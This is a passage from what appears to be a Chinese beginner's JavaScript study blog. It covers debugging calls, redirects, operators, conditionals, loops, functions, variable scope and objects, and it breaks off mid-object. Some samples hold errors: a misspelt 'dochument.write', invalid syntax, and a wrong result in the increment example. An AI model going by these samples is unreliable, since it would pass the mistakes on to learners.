        <content type="html"><![CDATA[<h2 id="常用调试方法"><a href="#常用调试方法" class="headerlink" title="常用调试方法"></a>常用调试方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(x)</span><br><span class="line"><span class="built_in">document</span>.write(q);</span><br><span class="line"><span class="built_in">window</span>.alert(q);</span><br><span class="line"><span class="built_in">window</span>.confirm(确认)；</span><br><span class="line"><span class="built_in">window</span>.prompt(输入)；</span><br><span class="line"><span class="built_in">console</span>.log(q);</span><br><span class="line"><span class="built_in">console</span>.info(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.error(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.debug(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="常用跳转方法"><a href="#常用跳转方法" class="headerlink" title="常用跳转方法"></a>常用跳转方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">&#x27;index.html&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.history.back(-<span class="number">1</span>);</span><br><span class="line"><span class="built_in">window</span>.location=<span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="attr">javascript</span>:location.href=<span class="string">&quot;index.html&quot;</span>;</span><br><span class="line">onclick=<span class="string">&quot;window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;javascript:window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;location=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">top.location=<span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">self.location=<span class="string">&#x27;html&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="数据类型及数学运算"><a href="#数据类型及数学运算" class="headerlink" title="数据类型及数学运算"></a>数据类型及数学运算</h2><ul><li><em><strong>变量名只能包含字母、数字、下划线、$。并且对大小写敏感</strong></em></li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"> <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line"> <span class="keyword">var</span> c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">var</span> d = <span class="string">&quot;122hello world！333&quot;</span>;  </span><br><span class="line"><span class="comment">//多个字符组合叫字符串，字符型用单引号或者双引号</span></span><br><span class="line"> <span class="keyword">var</span> e = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"> <span class="keyword">var</span> q= a+b;  <span class="comment">//加+减-乘*除/</span></span><br><span class="line"> </span><br><span class="line"> a--; <span class="comment">//自减 1</span></span><br><span class="line"> --a; <span class="comment">//自减 1</span></span><br><span class="line"> a++; <span class="comment">//自加 1</span></span><br><span class="line"> ++a; <span class="comment">//自加 1</span></span><br><span class="line"> a=b; <span class="comment">//赋值  把B赋值给A，把后面的赋值给前面的。</span></span><br><span class="line"> a-=b; </span><br><span class="line"> a+=b; <span class="comment">//相当于a=a+b</span></span><br><span class="line"> sum+=i<span class="comment">//相当于sum=sum+i</span></span><br><span class="line"> a*=b;</span><br><span class="line"> a/=b;<span class="comment">//相当于 a=a/b,同上</span></span><br><span class="line"> a%b   <span class="comment">//取余</span></span><br><span class="line"> <span class="literal">true</span> &amp;&amp; <span class="literal">false</span> = <span class="literal">false</span><span class="comment">//与运算   ?与或非运算。    </span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">var</span> a=<span class="number">10</span>；</span><br><span class="line"> x=a++   </span><br><span class="line"> x=++a</span><br></pre></td></tr></table></figure><ul><li><em><strong>自增自减运算</strong></em></li></ul><p> 自增运算符(一种算数运算符)<br> <em><strong>a++:表示的是a=a+1,先赋值后运算<br> ++a:表示的是a=a+1,先运算后赋值</strong></em><br>i++返回的是自增之前的值，++i返回的是自增后的值。</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">2</span>             </span><br><span class="line"><span class="keyword">var</span> y=a++; </span><br><span class="line"><span class="keyword">var</span> x=++a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//y=2</span></span><br><span class="line"><span class="comment">//x=3</span></span><br><span class="line">alert(x);                    </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><em><strong>if…else..</strong></em>.</li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age =<span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span>(age&gt;=<span class="number">18</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;已成年&#x27;</span>)   </span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">      dochument.write(<span class="string">&quot;未成年&quot;</span>)        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>if…else if… else</strong></em> </li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = prompt(<span class="string">&quot;输入您的年龄&quot;</span>);  </span><br><span class="line">   <span class="keyword">if</span>(age&gt;=<span class="number">18</span>)<span class="comment">//条件1true</span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;已成年&quot;</span>) ;  </span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (age&gt;=<span class="number">0</span>&amp;&amp;age&lt;=<span class="number">18</span>)<span class="comment">//条件2true </span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;未成年&quot;</span>) ;       </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//false</span></span><br><span class="line">    &#123;</span><br><span class="line">    alert(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>*** if…else if…else if…else if…else***</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = prompt(<span class="string">&quot;输入您的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (count &gt;= <span class="number">90</span> &amp;&amp; count &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">80</span> &amp;&amp; count &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;你的成绩等级为B&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">60</span> &amp;&amp; count &lt;= <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为C&quot;</span>);      </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">0</span> &amp;&amp; count &lt;= <span class="number">60</span>)&#123;</span><br><span class="line"> <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为不及格！！&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的输入有误，请重新输入！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>判断语句的嵌套</strong></em></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="number">5</span>,y=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(y&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&gt;5&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&lt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">10</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y==10&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y!=10 &amp;&amp; x&gt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>switch…case</strong></em><br>根据条件，case 选择执行</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = prompt(<span class="string">&quot;?&quot;</span>)</span><br><span class="line"><span class="keyword">switch</span>(value)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cat&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is cat&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;dog&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is dog&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;dashuaibi&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>*** 三元运算符***<blockquote><p>条件表达式?语句1:语句2;<br>满足条件执行语句1，不满足执行语句2</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">20</span>;</span><br><span class="line">a &gt; b ? <span class="built_in">document</span>.write(<span class="string">&quot;a大&quot;</span>):<span class="built_in">document</span>.write(<span class="string">&quot;b大&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while循环</strong><blockquote><p>while (条件){<br>循环体语句；<br>} </p></blockquote></li></ul><p>先判断条件，如果为真便执行循环体语句，直到条件为假时才结束</p><p>循环，并继续执行循环程序后的语句，恒真假条件：0&lt;1恒为真，0&gt;1恒为假，只有0为假。-1,1为真。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(sum)</span><br></pre></td></tr></table></figure><ul><li><strong>do…while循环</strong><blockquote><p>do{<br>//循环体语句；<br>}while(测试条件);</p></blockquote></li></ul><p>do while是先执行循环体语句，在进行条件判断，所以为假时也能执行一次循环体语句。<br>而while语句是先判断条件在执行循环体语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;=<span class="number">100</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>for循环</strong><blockquote><p>for(表达式1;表达式2;表达式3)<br>{<br>//被执行的代码块<br>}<br>//后续代码 </p></blockquote></li></ul><ul><li>表达式1：循环开始前执行一次</li><li>表达式2：定义运行循环的条件</li><li>表达式3：再循环已被执行之后执行</li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">document</span>.write(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li> **for/in便利数组 **</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">of</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i =<span class="number">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(arr[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p> <strong>break&amp;continue语句</strong></p></li><li><p>break退出直接封闭它的switch、while、do while或者for语句，当多个循环语句彼此嵌套时，break只应用于最里层的语句，直接跳出当前循环。</p></li><li><p>continue开始直接封闭它的switch、while、do while或者for语句的一次新迭代，跳过本次循环，进入下一次循环，多个循环语句嵌套时，continue只应用最里层的语句。</p></li></ul><p><em><strong>break</strong></em></p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">var</span> x =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=x + i +<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*** continue***</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x= x + i + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        dochument.write(x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li><p>封装好的一段代码块</p></li><li><p><strong>不带参数的函数</strong></p><blockquote><p>function 函数名()<br>{<br>//函数体;<br>}</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="number">20</span>;</span><br><span class="line">    sum = a + b;</span><br><span class="line">    <span class="built_in">document</span>.write(sum);&#125;</span><br><span class="line"> add();</span><br></pre></td></tr></table></figure><ul><li><strong>带参数的函数</strong><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；<br>}</p></blockquote></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = a+b;  </span><br><span class="line">   <span class="built_in">document</span>.write(sum);</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">10</span>,<span class="number">20</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>带返回值的函数</strong></li></ul><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；</p><p>return sum；</p><p>}</p></blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    sum = num1+ num2;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> value1 = add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c;</span><br><span class="line">c = value1;</span><br><span class="line"><span class="built_in">document</span>.write(c);</span><br></pre></td></tr></table></figure><ul><li><strong>匿名函数</strong></li></ul><blockquote><p>没有名的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myfunction;</span><br><span class="line">myfunction = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> a*b&#125;;</span><br><span class="line"><span class="keyword">var</span> c = myfunction(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="built_in">document</span>.write(c)</span><br></pre></td></tr></table></figure><ul><li><strong>自调用函数</strong></li></ul><blockquote><p>自己调用自己的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    dochument.write(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于 add();</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><p>局部变量：在函数中通过var声明的变量。</p></li><li><p>全局变量：在函数外通过var声明的变量。</p></li></ul><p>没有声明就使用的变量，默认为全局变量，不论这个变量在哪被使用。</p><ul><li><strong>全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>局部变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//局部变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>在函数里面定义全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    counter = <span class="number">1</span>;<span class="comment">//在函数里面定义全局变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="类-amp-对象"><a href="#类-amp-对象" class="headerlink" title="类&amp;对象"></a>类&amp;对象</h2><ul><li><strong>创建类</strong></li></ul><p>创建一个空白的对象模板，可理解为带参数的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">name,age,job</span>)</span>&#123;    <span class="comment">//创建类</span></span><br><span class="line">    <span class="built_in">this</span>.name= name;         <span class="comment">//类属性</span></span><br><span class="line">    <span class="built_in">this</span>.age=age;</span><br><span class="line">    <span class="built_in">this</span>.job=job;</span><br><span class="line">    <span class="built_in">this</span>.sayname=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br><span class="line">person1 = <span class="keyword">new</span> person(<span class="string">&quot;gets&quot;</span>,<span class="number">23</span>,<span class="string">&quot;CEO&quot;</span>)  <span class="comment">//实例化类 也就是通过new来创建一个对象</span></span><br><span class="line">person1.sayname();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>创建一个对象</strong></li></ul><p>定义对象的属性，访问对象的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span> : <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    <span class="attr">age</span> : <span class="number">50</span>,</span><br><span class="line">    <span class="attr">eyeColor</span>:<span class="string">&quot;blue&quot;</span></span><br><span class="line">    